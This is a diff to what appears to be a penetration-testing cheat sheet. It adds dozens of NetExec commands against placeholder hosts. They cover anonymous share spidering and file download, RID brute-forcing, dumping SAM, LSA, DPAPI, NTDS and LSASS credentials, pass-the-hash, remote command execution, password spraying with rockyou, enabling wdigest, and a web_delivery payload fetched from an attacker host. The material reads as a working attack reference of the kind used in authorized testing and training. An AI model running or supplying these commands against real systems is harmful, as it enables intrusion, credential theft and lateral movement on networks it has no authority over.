@@ -534,11 +534,65 @@ $ poetry install
 $ poetry run NetExec
 ```
 
+### Modules
+
+```c
+$ netexec ldap -L
+$ netexec mysql -L
+$ netexec smb -L
+$ netexec ssh -L
+$ netexec winrm -L
+```
+
 ### Common Commands
 
 ```c
+$ netexec smb <RHOST> -u '' -p '' --shares
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+$ netexec smb <RHOST> -u " " -p "" --shares
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
+$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
+$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
+$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
+$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
+$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
+$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
+$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
+$ netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
+$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
+$ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
+$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
+$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
+$ netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
+$ netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
+$ netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 $ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
 ```
 
 ## Patator
